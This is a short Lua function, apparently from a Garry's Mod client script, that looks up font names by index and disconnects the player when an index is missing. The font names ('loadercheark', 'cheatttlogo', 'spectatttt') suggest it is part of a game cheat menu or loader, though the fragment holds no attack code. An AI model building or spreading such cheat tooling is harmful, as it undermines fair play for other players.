function getfontfe(arg)
local fontsrift = {}
--print(arg)

fontsrift[1] = "loadercheark";
fontsrift[2] = "cheatttlogo";
fontsrift[3] = "tekstvvike";
fontsrift[4] = "textnamess";
fontsrift[5] = "buttonchange";
fontsrift[6] = "textloadersbut";
fontsrift[7] = "spectatttt";
fontsrift[8] = "myidfont";
fontsrift[9] = "inventttsssloader";
fontsrift[10] = "textvbitocjnirgrgf";
fontsrift[11] = "dtextentryfonnts";
fontsrift[12] = "diskfont";
fontsrift[13] = "screenkaptuijde";



if fontsrift[arg] == nil then
errorfolenorik("Font Error", ""..arg.."")
RunConsoleCommand("disconnect")
return
end

return fontsrift[arg]
end





